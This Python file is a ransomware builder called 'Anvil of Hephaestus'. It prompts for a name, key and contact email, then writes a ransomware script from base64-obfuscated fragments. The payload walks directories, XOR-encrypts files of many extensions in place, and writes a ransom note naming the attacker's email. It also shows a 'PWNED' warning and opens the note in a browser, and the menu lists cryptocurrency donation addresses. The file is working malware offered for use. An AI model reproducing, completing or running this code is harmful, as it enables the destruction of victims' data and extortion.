# =================================================================
# Anvil of Hephaestus 1.0.0
# =================================================================
import sys,os,base64
import secrets
import colorama
from colorama import Style, Fore, Back

# Initialize:
colorama.init()
os.system("clear")

# =================================================================
# Generate Payload:
# =================================================================
def generate():
    # Ransomware name:
    ransomware_name = input(Style.BRIGHT + Fore.RED + "[*] Ransomware name: " + Style.RESET_ALL).lower()
    ransomware_name = ransomware_name.replace(" ", "_")
    # Ransomware main key:
    main_key = input(Style.BRIGHT + Fore.RED + "[*] Main encryption key: ('r' to random) " + Style.RESET_ALL).lower()
    if main_key == "r":
        main_key = secrets.token_urlsafe(16)
        print(Style.BRIGHT + Fore.RED + "    Your key is {0}.".format(main_key))
    # Contact email:
    contact_email = input(Style.BRIGHT + Fore.RED + "[*] Contact email: " + Style.RESET_ALL).lower()
    # =================================================================
    # Starting Code:
    # =================================================================
    #os.system("touch {0}.py".format(ransomware_name))
    with open("{0}.py".format(ransomware_name), "wb") as fl:
        # Prepare code:
        import_stuff = b"aW1wb3J0IG9zLGdjLGJhc2U2NCxiaW5hc2NpaSx3ZWJicm93c2VyCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKZnJvbSBwYXRobGliIGltcG9ydCBQYXRoCmZyb20gaGFzaGxpYiBpbXBvcnQgYmxha2Uycwpmcm9tIHRraW50ZXIgaW1wb3J0IG1lc3NhZ2Vib3gKZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl91cmxzYWZlCg=="
        root_path = b"CmlmIFRydWU6CiAgICB0cnk6CiAgICAgICAgb3MuY2hkaXIoIi8iKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlcnJvcjoKICAgICAgICBwYXNzCg=="
        node_setup = b"bm9kZV9zaWcgPSB0b2tlbl91cmxzYWZlKDE2KQpub2RlX2tleSA9IGJsYWtlMnMoc3RyKG5vZGVfc2lnICsgJw=="
        node_setup_b = base64.b64encode(main_key.encode())
        node_setup_c = b"JykuZW5jb2RlKCkpLmhleGRpZ2VzdCgpWzI0OjQ4XVs6Oi0xXQpzaWduX3BhdGggPSBzdHIoUGF0aC5ob21lKCkpICsgIi9zaWduX3swfS50eHQiLmZvcm1hdChub2RlX3NpZyk="
        tool_class = b"CmNsYXNzIFRvb2w6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5maWxlc19mb3VuZCA9IFtdCiAgICAgICAgc2VsZi50YXJnZXRzID0gWyJ0eHQiLCAicGRmIiwgIm9kdCIsICJ4bHMiLCAicG5nIiwgImpwZyIsICJqcGVnIiwgImh0bWwiLAogICAgICAgICAgICAgICAgICAgICAgICAiZXB1YiIsICJtcDMiLCAiZ2lmIiwgImRvYyIsICJvZHAiLCAib2RzIiwgImpzb24iLCAieG1sIiwKICAgICAgICAgICAgICAgICAgICAgICAgIm1wNCIsICJhdmkiLCAibWQiLCAib2dnIiwgInB5IiwgIm00YSIsICJpbmkiLCAiYyIsICJjcHAiLCAiamFyIiwKICAgICAgICAgICAgICAgICAgICAgICAgInJiIiwgImphdmEiLCAicGwiLCAiYXBrIiwgInJhdyIsICJlbWwiLCAibXNnIiwgInRtcCIsICJqcyIsCiAgICAgICAgICAgICAgICAgICAgICAgICJjb25mIiwgImNvbmZpZyIsICJ5YW1sIiwgImFzbSIsICJoIiwgInIiLCAibSIsICJsdWFjIiwgImRhdCIsCiAgICAgICAgICAgICAgICAgICAgICAgICJzYXNmIiwgImx1YSIsICJzcmMiLCAicGVybCIsICJjIyIsICJnbyIsICJzbWFsaSIsICJjc3Byb2oiLAogICAgICAgICAgICAgICAgICAgICAgICAiYmFzaCIsICJzaCIsICJhc2ljIiwgInJ1biIsICJ2YiIsICJ2YmUiLCAia3QiLCAibHNwIiwgInZiYSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJudCIsICJnZW9qc29uIiwgImMrKyIsICJwczEiLCAiZGV2IiwgIm1rIiwgIm93bCIsICJzY2FsYSIsICJwaHAiLAogICAgICAgICAgICAgICAgICAgICAgICAib2RsIiwgInJhciIsICJiYWsiLCAiYmtwIiwgImlzbyIsICJ6aXAiLCAiN3oiLCAic2JmIiwgIm9sZCIsICJtZXRhIiwKICAgICAgICAgICAgICAgICAgICAgICAgInBzdyIsICJia2YiLCAiZmJrIiwgInhhciIsICJtb3otYmFja3VwIiwgIm9yaWciLCAibmV3IiwgIjAwMSIsICJicHMiLAogICAgICAgICAgICAgICAgICAgICAgICAiaW1nIiwgImRlbGV0ZWQiLCAiZWciLCAicmVuIiwgInVuZG8iLCAib2ZiIiwgImRhMSIsICJzcWwiLCAiYmFrMSIsICJnY2IiLAogICAgICAgICAgICAgICAgICAgICAgICAiaW4xIiwgIm9jaCIsICJleGNsdWRlIiwgImRhdGEiLCAiJCQkIiwgIjAwMCIsICJiYWMiLCAiYXJjIiwgImFzc2V0cyIsCiAgICAgICAgICAgICAgICAgICAgICAgICJyZXNvdXJjZSIsICJyZXNTIiwgImluZm8iLCAiZGxsIiwgInZkeCIsICJjYWNoZSIsICJjc3YiXQp0b29sID0gVG9vbCgpCg=="
        xor_function = b"ZGVmIGVuY3J5cHQoY29udGVudDogc3RyLCBrZXk6IHN0cikgLT4gYnl0ZXM6CiAgICBrZXlfaWQgPSAwCiAgICB4b3JlZCA9ICIiCiAgICBmb3Iga2V5X2lkLCBjIGluIGVudW1lcmF0ZShjb250ZW50KToKICAgICAgICB4b3JlZCArPSBjaHIob3JkKGtleVtrZXlfaWQgJSBsZW4oa2V5KV0pIF4gb3JkKGMpKQogICAgICAgIGtleV9pZCArPSAxCiAgICByZXR1cm4gYmluYXNjaWkuaGV4bGlmeSh4b3JlZC5lbmNvZGUoKSk="
        file_finder = b"CmZvciBkaXJwYXRoLCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKG9zLmdldGN3ZCgpKToKICAgIGZvciBmIGluIGZpbGVzOgogICAgICAgIHBhdGggPSBvcy5wYXRoLmFic3BhdGgob3MucGF0aC5qb2luKGRpcnBhdGgsIGYpKQogICAgICAgIGZfZXh0ZW5zaW9uID0gcGF0aC5zcGxpdCgnLicpWy0xXQogICAgICAgIGlmIGZfZXh0ZW5zaW9uIGluIHRvb2wudGFyZ2V0czoKICAgICAgICAgICAgdG9vbC5maWxlc19mb3VuZC5hcHBlbmQocGF0aCkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgcGF0aCAhPSBzaWduX3BhdGg6CiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJyYiIpIGFzIGZsOgogICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gZmwucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgZW5jb2RlZF9kYXRhID0gYmFzZTY0LmI2NGVuY29kZShkYXRhKQogICAgICAgICAgICAgICAgICAgIHRtcF9rZXkgPSBub2RlX2tleVs6Oi0xXSArIHBhdGhbOjotMV0KICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfZGF0YSA9IGVuY3J5cHQoc3RyKGVuY29kZWRfZGF0YSksIHN0cih0bXBfa2V5KSkKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4ocGF0aCwgIndiIikgYXMgZmw6CiAgICAgICAgICAgICAgICAgICAgICAgIGZsLndyaXRlKGVuY3J5cHRlZF9kYXRhKQogICAgICAgICAgICAgICAgICAgIHNsZWVwKDAuMSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlcnJvcjoKICAgICAgICAgICAgICAgIHBhc3MKZGVsIG5vZGVfa2V5CmdjLmNvbGxlY3QoKQo="
        create_log = b"d2l0aCBvcGVuKHNpZ25fcGF0aCwgInciKSBhcyBmbDoKICAgIGZsLndyaXRlKCJZb3UgaGF2ZSBiZWVuIHB3bmVkIGJ5IA=="
        create_log_b = base64.b64encode(ransomware_name.encode())
        create_log_c = b"LgoiKQogICAgZmwud3JpdGUoIlNlbmQgYSBtZXNzYWdlIHRvIA=="
        create_log_d = base64.b64encode(contact_email.encode())
        create_log_e = b"IHRvIGdldCB5b3VyIHJlY292ZXJ5IHRvb2wuCgoiKQogICAgZmwud3JpdGUoIk5vZGUgU2lnbmF0dXJlOiB7MH0KIi5mb3JtYXQobm9kZV9zaWcpKQogICAgZmwud3JpdGUoInswfSBGaWxlKHMpIGFmZmVjdGVkOgoKIi5mb3JtYXQobGVuKHRvb2wuZmlsZXNfZm91bmQpKSkKICAgIGZvciBmaWxlIGluIHRvb2wuZmlsZXNfZm91bmQ6CiAgICAgICAgZmwud3JpdGUoZmlsZSArICIKIikKCg=="
        gui = b"bWVzc2FnZWJveC5zaG93d2FybmluZyh0aXRsZT0iIVBXTkVEIGJ5IA=="
        gui_b = base64.b64encode(ransomware_name.encode())
        gui_c = b"LgoiKQogICAgZmwud3JpdGUoIlNlbmQgYSBtZXNzYWdlIHRvIA=="
        gui_d = base64.b64encode(contact_email.encode())
        gui_e = b"IHRvIGdldCB5b3VyIHJlY292ZXJ5IHRvb2wuCgpOb2RlIFNpZ25hdHVyZTogezF9IiIiLmZvcm1hdChsZW4odG9vbC5maWxlc19mb3VuZCksIG5vZGVfc2lnKSkKIyBTaG93IGNvbnRlbnRzOgp3ZWJicm93c2VyLm9wZW4oImZpbGU6Ly97MH0iLmZvcm1hdChzaWduX3BhdGgpLCBuZXc9Mik="
        # Save stuff:
        fl.write(base64.b64decode(import_stuff))
        fl.write(base64.b64decode(root_path))
        fl.write(base64.b64decode(node_setup))
        fl.write(base64.b64decode(node_setup_b))
        fl.write(base64.b64decode(node_setup_c))
        fl.write(base64.b64decode(tool_class))
        fl.write(base64.b64decode(xor_function))
        fl.write(base64.b64decode(file_finder))
        fl.write(base64.b64decode(create_log))
        fl.write(base64.b64decode(create_log_b))
        fl.write(base64.b64decode(create_log_c))
        fl.write(base64.b64decode(create_log_d))
        fl.write(base64.b64decode(create_log_e))
        fl.write(base64.b64decode(gui))
        fl.write(base64.b64decode(gui_b))
        fl.write(base64.b64decode(gui_c))
        fl.write(base64.b64decode(gui_d))
        fl.write(base64.b64decode(gui_e))
        print(Style.BRIGHT + Fore.RED + "\n Your file was save as " + Fore.YELLOW + "{0}.py".format(ransomware_name) + Fore.RED + ".\n")
        sys.exit()

# =================================================================
# Menu
# =================================================================
option = ""
while option != "q":
    print(Fore.RED + Style.BRIGHT + """
      .-------..___
      '-.______:_.-'  """ + Fore.YELLOW + """Anvil of""" + Fore.RED + """
          ) _ (      """ + Fore.YELLOW + """Hephaestus""" + Fore.RED + """
         '-' '-'      v.1.0.0\n""")
    print(Fore.YELLOW + "[g]" + Fore.RED + "enerate disposable ransomware.")
    print(Fore.YELLOW + "[d]" + Fore.RED + "onate to this project.")
    print(Fore.YELLOW + "[q]" + Fore.RED + "uit.")
    option = input(">>> " + Style.RESET_ALL).lower()
    # Check option:
    if option == "g":
        generate()
    elif option == "d":
        print(Style.BRIGHT + Fore.RED + "\nThank you very much! :)")
        print("Your support is very important for this project!\n")
        print(Fore.YELLOW + "BTC" + Fore.RED + " 33AuPJ7Fg3MDX78vpKZB9xSnp3i1y4Dd7T")
        print(Fore.YELLOW + "ETH" + Fore.RED + " 0x1a47Ed0C52b07DFE329858D3aA1847Eccc2c105a")
        print(Fore.YELLOW + "LTC" + Fore.RED + " M9Nex8ecVSpnyf1XamjHEmsZDhqF74cWPX")
        print(Fore.YELLOW + "XMR" + Fore.RED + " 8AKUwHbxAkHbveQ823ca6GFpxTHqKYX8hTfWHxARFavf3cJXq4UCS7XXHNz84ZRqGNKv2n7R1DXez7HRUNu136QHMyJJVp2")
        print(Fore.YELLOW + "DOGE" + Fore.RED + " DRWTE1wNxBTHxKy5Pek1rFHEqpqjPFTbZb")
        print("\nIf you would like to donate another coin, please contact me.\n")
        sys.exit()
    elif option == "q":
        print(Style.BRIGHT + Fore.RED + "Thank you. :)")
        sys.exit()
    else:
        os.system("clear")
# Done. :)
